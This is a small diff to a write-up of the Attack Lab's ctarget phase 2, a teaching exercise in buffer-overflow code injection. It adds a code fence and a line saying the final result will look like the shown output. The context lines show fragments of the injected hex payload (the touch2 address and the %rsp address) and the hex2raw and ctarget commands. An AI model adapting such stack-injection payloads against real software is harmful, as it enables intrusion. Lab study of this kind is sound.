@@ -117,6 +117,7 @@ b5 18 40 00 c3 00 00 00 /*Pushes touch2 adress and returns*/
 00 00 00 00 00 00 00 00
 88 e5 67 55 00 00 00 00 /*address of %rsp*/
 
+```
 
 We run it through hex2raw
 
@@ -126,6 +127,7 @@ And run the raw file
 
 `./ctarget < raw-phase2.txt`
 
+The final resutl will be something like this
 
 ```
 Cookie: 0x2d274378
